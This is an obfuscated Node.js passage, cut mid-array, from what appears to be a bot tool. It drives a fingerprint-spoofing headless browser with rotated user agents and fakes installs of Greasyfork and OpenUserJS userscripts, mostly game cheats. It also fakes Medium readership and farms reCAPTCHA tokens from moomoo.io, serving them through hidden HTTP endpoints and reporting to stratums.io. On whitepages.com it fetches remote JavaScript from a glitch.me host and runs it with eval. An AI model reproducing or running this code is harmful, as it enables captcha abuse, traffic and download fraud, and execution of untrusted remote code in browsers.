      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + a1(0x9, 'pLcR') + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + a1(0x19, '(Z9y') + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + a1(0x20, 'ijPR') + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + a1(0xd, 'VSOI')
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + a2(0xc) + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + a2(0x5) + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    a1(0x1d, ')X4g') + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    a1(0x15, '2dKu') + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + a3(0x16),
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + a3(0x25),
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + a2(0x2) + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + a3(0x1b) + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => 0x13b9 + 0x3cb + -0x7 * 0x35c
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](-0x56b + -0x169 + 0x6d4)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, -0x1 * -0x24e1 + -0x1 * 0x97 + -0x23e6), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, -0x1 * -0x57a + 0x1 * -0x16d6 + 0x2 * 0x8e0), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = 0x124c + -0x9c8 * 0x1 + -0x221 * 0x4;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = 0x141b + 0x2 * -0x12af + 0x3 * 0x5c1; w < getRandomInt(-0x1679 + 0x4fc * -0x7 + 0x395e * 0x1, -0x108b + -0x1724 + 0x27b4); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(0x1044 * -0x19 + 0x19f * -0x9d + -0x1 * -0x37f87);
        }
      }();
    }, 0x106 * 0x20 + -0x5 * -0x701 + -0x1 * 0x4361), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = -0x12d4 + -0x48f * -0x3 + -0x1 * -0x527;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](-0x1 * 0x11ab + -0x2481 + 0x2 * 0x1b16, 0x1 * -0x23c1 + -0x9a9 + 0x2a * 0x116)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, -0xd * -0x8e9 + 0x4d * -0x1a5 + -0x2 * -0x3ffe);
    }, 0x59f * -0x1 + 0x22d1 + 0x99a * -0x3), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = 0x5 * -0x232 + 0x1e1a + -0x1320;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(0x2275 + 0x20c3 + -0xc * 0x4a0), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', -0x1 * -0x120d + 0x607 + -0x1814), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(-0xc084c + 0xec2cc + 0x3e * 0x2d70);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, -0x26 * 0x76 + -0x443 * 0x2 + 0x1a6e);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](-0x7b7 + -0x1d8c + -0x1 * -0x260b);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || -0x389f + -0x41e * 0xb + 0x8579);
}
doFlags['doOUJS'] && ((async () => {
  const a7 = d;
  async function f() {
    const a6 = d,
      a5 = c,
      k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = -0x23 * -0x17 + 0x1219 + -0x153d) {
        const a4 = d;
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf'](a4(0x29)) + 'Firefox' ['length'] + (0x1299 + -0x22b6 + 0x101e));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](0x1578 + 0x18d3 + -0x2e4b, D['indexOf']('\x20'));
        return B ? E['slice'](-0x2403 + 0x835 + 0x1bce, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](0x379 + -0x2bbe + 0x4f55),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x[a5(0x1c)]['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](-0x2be2 + -0x48f * 0x9 + 0xd5 * 0x95),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + a6(0x26) + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + a6(0x1a),
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': a6(0x6)
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      a7(0x17) + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
